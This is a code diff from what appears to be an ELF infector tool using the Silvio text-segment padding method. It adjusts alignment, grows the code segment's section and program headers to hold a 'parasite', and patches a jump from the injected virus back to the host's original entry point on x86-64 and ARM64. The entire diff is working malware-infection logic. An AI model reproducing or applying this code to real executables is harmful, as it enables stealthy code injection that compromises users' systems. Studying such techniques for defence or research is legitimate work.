@@ -52,6 +52,8 @@ struct SilvioElfInfo {
   size_t patch_entry_idx;
 };
 
+uint64_t next_32_bit_aligned_addr(uint64_t v) { return (v & (~0b11)) + 4; }
+
 // Patch SHT (i.e. find the last section of CODE segment and increase its size
 // by parasite_size)
 bool patch_sht(vt::common::Mmap<PROT_READ | PROT_WRITE>& output_mapping,
@@ -72,7 +74,10 @@ bool patch_sht(vt::common::Mmap<PROT_READ | PROT_WRITE>& output_mapping,
       // This is the last section of CODE Segment
       // Increase the sizeof this section by a parasite_size to accomodate
       // parasite
-      section_entry->sh_size += parasite_size;
+      // Similiar to patching phdr, add the extra alignment if necessary.
+      auto next_aliged = next_32_bit_aligned_addr(code_segment_end_offset);
+      section_entry->sh_size +=
+          parasite_size + (next_aliged - code_segment_end_offset);
       return true;
     }
     // Move to the next section entry
@@ -89,8 +94,15 @@ void patch_phdr(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
   // Point to first entry in PHT
   auto phdr_entry = (Elf64_Phdr*)(host_mapping.mutable_base() + pht_offset);
   phdr_entry += patch_entry_idx;
-  phdr_entry->p_filesz += parasite_size;
-  phdr_entry->p_memsz += parasite_size;
+
+  // parasite offset is always aligned to 4 bytes. However, the original segment
+  // end might not. When calculating the new size, add the extra alignment bytes
+  // if needed.
+  auto end = phdr_entry->p_offset + phdr_entry->p_filesz;
+  auto next_aligned = next_32_bit_aligned_addr(end);
+  auto alignment = next_aligned - end;
+  phdr_entry->p_filesz += parasite_size + alignment;
+  phdr_entry->p_memsz += parasite_size + alignment;
 }
 
 Elf64_Addr patch_ehdr(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
@@ -112,6 +124,8 @@ bool patch_parasite_and_resume_control(
     Elf64_Addr original_entry_point, size_t parasite_size,
     vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
     SilvioElfInfo& info) {
+  auto header = reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
+
 #if defined(__x86_64__)
   // For x86-64, patch the jmp address to the original entry point.
   // It is assumed that the inserted virus has at least 8 bytes of noop and
@@ -124,7 +138,6 @@ bool patch_parasite_and_resume_control(
     printf("failed to patch host entry\n");
     return false;
   }
-  auto header = reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
   int32_t rel = 0;
   if (header->e_type == ET_EXEC) {
     // for executables, the original entry is the load address, the parasite
@@ -150,21 +163,37 @@ bool patch_parasite_and_resume_control(
   // imm26 = rel / 4
   // The rel is offset from the current instruction (b xxx)
   // The patched jump instruction is always 4 bytes.
-
   auto cur = common::find<uint32_t>(host_mapping.base() + info.parasite_offset,
                                     parasite_size, 0xd503201f);
   if (cur == -1) {
     printf("failed to patch host entry\n");
     return false;
   }
-  int32_t rel = original_entry_point - (info.parasite_offset + cur);
-  printf("original 0x%x\n", original_entry_point);
-  printf("cur jmp 0x%x\n", info.parasite_offset + cur);
-  printf("diff 0x%d\n", rel);
+  int32_t rel = 0;
+  if (header->e_type == ET_EXEC) {
+    // for executables, the original entry is the load address, the parasite
+    // load address is the new memory address. Use that for offset calculation.
+    rel = original_entry_point - (info.parasite_load_address + cur);
+  } else if (header->e_type == ET_DYN) {
+    // Both original and parasite offset are relative address to the process
+    // start, which is not known until runtime.
+    rel = original_entry_point - (info.parasite_offset + cur);
+  } else {
+    CHECK_FAIL();
+  }
 
   rel /= 4;
-  *(int32_t*)(host_mapping.mutable_base() + info.parasite_offset + cur) = rel;
-  *(host_mapping.mutable_base() + info.parasite_offset + cur) &= 0b101;
+  auto* inst =
+      (int32_t*)(host_mapping.mutable_base() + info.parasite_offset + cur);
+  printf("patching jump at %x\n", info.parasite_offset + cur);
+
+  *inst = rel;
+
+  // clear op-code bits
+  *inst &= (0b00000011111111111111111111111111);
+  // fill in op-code
+  *inst |= (0b00010100000000000000000000000000);
+
 #endif
   return true;
 }
@@ -192,8 +221,14 @@ bool get_info(const char* host_mapping, uint64_t parasite_size,
       // Calculate the offset where the code segment ends to bellow calculate
       // padding_size
       code_segment_end_offset = phdr_entry->p_offset + phdr_entry->p_filesz;
-      parasite_offset = code_segment_end_offset;
-      parasite_load_address = phdr_entry->p_vaddr + phdr_entry->p_filesz;
+      // Sometimes the previous section is data. Make sure it's aligned to
+      // 32-bit for arm. x86 has not such requirement but do it anyways.
+      parasite_offset = next_32_bit_aligned_addr(code_segment_end_offset);
+
+      parasite_load_address =
+          next_32_bit_aligned_addr(phdr_entry->p_vaddr + phdr_entry->p_filesz);
+      printf("code segment end %x\n", code_segment_end_offset);
+      printf("parasite offset %x\n", parasite_offset);
       continue;
     }
 
@@ -204,6 +239,7 @@ bool get_info(const char* host_mapping, uint64_t parasite_size,
         // is really wrong if it's not.
         return false;
       }
+      printf("next segment begin %x\n", phdr_entry->p_offset);
       // Return padding_size (maximum size of parasite that host can accomodate
       // in its padding between the end of CODE segment and start of next
       // loadable segment)
